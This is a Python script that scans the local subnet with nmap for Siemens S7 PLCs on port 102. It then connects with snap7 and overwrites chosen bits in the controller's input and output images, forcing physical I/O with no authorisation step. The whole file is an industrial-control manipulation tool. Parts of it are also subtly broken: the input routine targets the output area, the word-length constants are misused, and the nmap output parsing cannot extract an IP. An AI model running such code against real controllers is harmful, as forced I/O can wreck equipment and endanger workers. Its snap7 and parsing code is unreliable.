import snap7
import socket
import struct
import time
import subprocess  # For IP address discovery if needed

# Configuration (Adjust these according to your setup)
PLC_IP = None  # Will be discovered if None
PLC_RACK = 0
PLC_SLOT = 1
INPUT_BYTE_ADDRESS = 0  # Start byte address of the input image to manipulate
INPUT_BIT_OFFSET = 0  # Bit offset within the input byte (0-7)
OUTPUT_BYTE_ADDRESS = 0 # Start byte address of the output image to manipulate
OUTPUT_BIT_OFFSET = 0 # Bit offset within the output byte (0-7)
FORCE_INPUT_VALUE = True  # Boolean value to force on the input  (True/False)
FORCE_OUTPUT_VALUE = True # Boolean value to force on the output (True/False)
SCAN_DELAY = 0.1 # Time to wait for a single scan cycle

def find_plc_ip():
    """
    Attempts to find the PLC's IP address by scanning the network.
    This is a basic example and may need to be adapted based on your network setup.
    This example relies on `nmap` being installed and accessible in the system's PATH.
    """
    try:
        # Get the network address of the default gateway
        default_route = subprocess.check_output(["route", "-n"]).decode("utf-8")
        for line in default_route.splitlines():
            parts = line.split()
            if len(parts) > 1 and parts[0] == '0.0.0.0':
                gateway_ip = parts[1]
                break
        else:
            print("Gateway IP not found")
            return None

        # Get the network address based on the gateway
        gateway_prefix = gateway_ip.split('.')[:3]
        network_address = '.'.join(gateway_prefix) + '.0/24'

        print(f"Scanning network {network_address} for Siemens PLCs...")

        # Use nmap to scan for Siemens PLCs (using the default S7 port 102)
        nmap_output = subprocess.check_output(["nmap", "-p102", "-T4", network_address]).decode("utf-8")

        for line in nmap_output.splitlines():
            if "102/tcp" in line and "open" in line and "s7comm" in line.lower():  # Look for open port 102 (S7 protocol)
                ip_address = line.split()[0]
                print(f"Found potential PLC IP address: {ip_address}")
                return ip_address

        print("No Siemens PLC found on the network.")
        return None

    except FileNotFoundError:
        print("Error: nmap is not installed or not in your system's PATH.")
        print("Please install nmap to use automatic IP discovery.")
        return None
    except Exception as e:
        print(f"Error during IP discovery: {e}")
        return None

def manipulate_input_image(client, byte_address, bit_offset, value):
    """
    Manipulates a specific bit in the PLC's input image.
    """
    try:
        # Read the current input byte
        input_data = client.read_area(snap7.const.Areas.PA, snap7.const.PE_WORD, byte_address, 1)
        current_byte = input_data[0]

        # Modify the specific bit
        if value:
            new_byte = current_byte | (1 << bit_offset)  # Set the bit
        else:
            new_byte = current_byte & ~(1 << bit_offset) # Clear the bit

        # Write the modified byte back to the input image
        data = bytearray([new_byte]) #convert the new byte to a bytearray for writing
        client.write_area(snap7.const.Areas.PA, snap7.const.PE_WORD, byte_address, data)

        print(f"Successfully manipulated input byte at address {byte_address}, bit {bit_offset} to {value}")

    except Exception as e:
        print(f"Error manipulating input image: {e}")


def manipulate_output_image(client, byte_address, bit_offset, value):
        """
        Manipulates a specific bit in the PLC's output image.
        """
        try:
            # Read the current output byte
            output_data = client.read_area(snap7.const.Areas.PA, snap7.const.PA_WORD, byte_address, 1)
            current_byte = output_data[0]

            # Modify the specific bit
            if value:
                new_byte = current_byte | (1 << bit_offset)  # Set the bit
            else:
                new_byte = current_byte & ~(1 << bit_offset)  # Clear the bit

            # Write the modified byte back to the output image
            data = bytearray([new_byte])
            client.write_area(snap7.const.Areas.PA, snap7.const.PA_WORD, byte_address, data)

            print(f"Successfully manipulated output byte at address {byte_address}, bit {bit_offset} to {value}")

        except Exception as e:
            print(f"Error manipulating output image: {e}")


def main():
    global PLC_IP # Allows access to the global PLC_IP variable.  Critical if you modify it here.

    if PLC_IP is None:
        PLC_IP = find_plc_ip()
        if PLC_IP is None:
            print("PLC IP address could not be determined. Please set it manually.")
            return

    print(f"Using PLC IP address: {PLC_IP}")

    client = snap7.client.Client()

    try:
        client.connect(PLC_IP, PLC_RACK, PLC_SLOT)
        print(f"Connected to PLC at {PLC_IP}")

        # Manipulate input image (simulating forced input)
        manipulate_input_image(client, INPUT_BYTE_ADDRESS, INPUT_BIT_OFFSET, FORCE_INPUT_VALUE)

        # Wait for a specified time to give PLC the time to execute one scan cycle
        time.sleep(SCAN_DELAY)

        # Manipulate output image (simulating forced output)
        manipulate_output_image(client, OUTPUT_BYTE_ADDRESS, OUTPUT_BIT_OFFSET, FORCE_OUTPUT_VALUE)

    except Exception as e:
        print(f"Error communicating with PLC: {e}")
    finally:
        if client.get_connected():
            client.disconnect()
            print("Disconnected from PLC.")


if __name__ == "__main__":
    main()